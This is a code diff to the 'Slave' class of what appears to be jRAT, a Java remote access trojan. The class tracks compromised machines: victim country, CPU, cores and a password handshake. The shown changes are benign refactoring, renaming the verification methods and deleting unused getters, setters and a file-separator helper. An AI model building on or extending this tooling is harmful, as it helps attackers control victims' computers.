@@ -15,7 +15,6 @@ import se.jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.controller.packets.outgoing.Packet0Ping;
 
 import com.redpois0n.graphs.monitors.RemoteMonitor;
-import com.redpois0n.oslib.OperatingSystem;
 
 public class Slave extends AbstractSlave {
 
@@ -59,12 +58,12 @@ public class Slave extends AbstractSlave {
 					dis.readFully(remoteHash);					
 
 					if (Arrays.equals(localHash, remoteHash)) {
-						setVerified(true);
+						setAuthenticated(true);
 						continue;
 					}
 				}
 
-				if (!isVerified()) {
+				if (!isAuthenticated()) {
 					Main.instance.getPanelLog().addEntry("Warning", this, "Failed verifying password, not valid handshake");
 					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
 				}
@@ -117,14 +116,6 @@ public class Slave extends AbstractSlave {
 		}
 	}
 
-	public String getFileSeparator() {
-		if (getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-			return "\\";
-		} else {
-			return "/";
-		}
-	}
-	
 	public static boolean shouldFix(String i) {
 		return i.contains(" / ");
 	}
@@ -193,22 +184,6 @@ public class Slave extends AbstractSlave {
 		this.longcountry = longcountry;
 	}
 
-	public boolean hasResponded() {
-		return responded;
-	}
-
-	public void setResponded(boolean responded) {
-		this.responded = responded;
-	}
-
-	public boolean isChecked() {
-		return checked;
-	}
-
-	public void setChecked(boolean checked) {
-		this.checked = checked;
-	}
-
 	public short getCores() {
 		return cores;
 	}
@@ -223,22 +198,6 @@ public class Slave extends AbstractSlave {
 	
 	public void setCPU(String cpu) {
 		this.cpu = cpu;
-	}
-
-	public long getSent() {
-		return sent;
-	}
-
-	public void setSent(long sent) {
-		this.sent = sent;
-	}
-
-	public long getReceived() {
-		return received;
-	}
-
-	public void setReceived(long received) {
-		this.received = received;
 	}
 
 	public String getDisplayLanguage() {
